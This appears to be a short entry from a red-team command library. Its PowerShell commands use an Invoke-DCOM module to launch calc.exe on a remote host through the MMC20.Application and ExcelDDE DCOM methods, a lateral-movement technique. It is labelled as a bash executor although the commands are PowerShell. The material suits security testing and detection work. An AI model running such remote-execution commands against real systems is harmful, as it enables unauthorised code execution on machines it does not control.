---
id: 4f760c5f-ccc8-4f98-b9f7-49694784c806
name: Invoke DCOM to Start Calc.exe using MMC20.Application and ExcelDDE Methods
type: command
executor: bash
data: 'Import-Module .\Invoke-DCOM.ps1

  Invoke-DCOM -ComputerName ''10.10.10.10'' -Method MMC20.Application -Command "calc.exe"

  Invoke-DCOM -ComputerName ''10.10.10.10'' -Method ExcelDDE -Command "calc.exe"'
output: null
created_at: '2023-04-06T03:56:07.043461+00:00'
updated_at: '2023-04-10T20:26:18.160002+00:00'
---

# Invoke DCOM to Start Calc.exe using MMC20.Application and ExcelDDE Methods

```bash
Import-Module .\Invoke-DCOM.ps1
Invoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command "calc.exe"
Invoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command "calc.exe"
```
